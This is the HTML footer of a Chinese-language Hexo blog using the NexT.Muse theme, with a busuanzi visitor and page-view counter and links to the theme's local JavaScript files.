  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>-->

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
